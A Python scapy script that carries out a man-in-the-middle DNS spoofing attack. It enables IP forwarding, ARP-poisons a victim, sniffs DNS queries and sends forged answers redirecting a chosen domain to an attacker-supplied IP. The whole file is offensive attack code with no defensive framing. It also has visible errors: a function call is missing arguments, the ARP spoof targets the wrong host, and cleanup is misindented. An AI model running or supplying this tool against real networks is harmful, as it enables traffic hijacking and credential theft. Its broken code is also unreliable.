from scapy.all import *
from arp import * 


def get_mac_address(ip):
    """
    Get the mac address of some IP
    """
    try:
        packet = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip)
        resp, unans = srp(packet, timeout=2, verbose=False)
        if resp:
            return resp[0][1].hwsrc
    except Exception as e:
        print("Error getting MAC address for %s: %s" % (ip, e))
    return None

def set_ip_forwarding(ip_forwarding):
    """
    Sets the ip forwarding setting, enable or disable it
    """
    if ip_forwarding:
        print("Enabling IP forwarding")
        os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
    else:
        print("Disabling IP forwarding")
        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")

def send_dns_spoof_packet(packet, domain, spoofed_ip):
    spoofed_packet = (
        IP(dst=packet[IP].src, src=packet[IP].dst) /
        UDP(dport=packet[UDP].sport, sport=53) /
        DNS(
            id=packet[DNS].id,
            qr=1,
            aa=1,
            rd=1,
            ra=1,
            qd=packet[DNS].qd,
            an=DNSRR(rrname=domain, type='A', rdata=spoofed_ip, ttl=300)
        )
    )
    send(spoofed_packet, verbose=False)
    print("Send spoofed DNS response for %s to %s with IP %s" % (domain, packet[IP].src, spoofed_ip))

def handle_packet(packet, domain, spoofed_ip, victim_ip, router_ip):
    if packet.haslayer(DNS) and packet.getlayer(DNS).qr == 0:
        query_domain = packet.getlayer(DNS).qd.qname.decode('utf-8')
        print("DNS query received from %s: %s" % (packet[IP].src, query_domain))

        if query_domain == domain:
            print("Spoofing %s to %s" % (domain, spoofed_ip))
            send_dns_spoof_packet(packet)
        else:
            print("non spoofed DNS query for %s. forwarding to %s" % (query_domain, packet[IP].dst))
            send(packet, verbose=False)
    else:
        if packet.haslayer(IP):
            if packet[IP].src == victim_ip:
                send(packet, verbose=False)
            elif packet[IP].src == router_ip:
                send(packet, verbose=False)
                
def spoof(interface, domain, victim_ip, spoofed_ip):
    try:
        set_ip_forwarding(True)
        arp_thread = arp.two_way_arp_spoof(victim_ip, spoofed_ip, 2)
        router_ip = conf.route.route("0.0.0.0")[2]
        sniff(filter="udp and port 53", prn=lambda pkt: handle_packet(pkt, domain, spoofed_ip, victim_ip, router_ip), store=0, iface=interface)
    except KeyboardInterrupt:
        print("stopping DNS spoof")
    except Exception as e:
        print("An error occurred: %s" % e)
    finally:
        arp.stop_two_way_spoof()
        if arp_thread.is_alive():
            arp_thread.join(timeout=5)
            
            set_ip_forwarding(False)
            print("DNS spoofing stopped")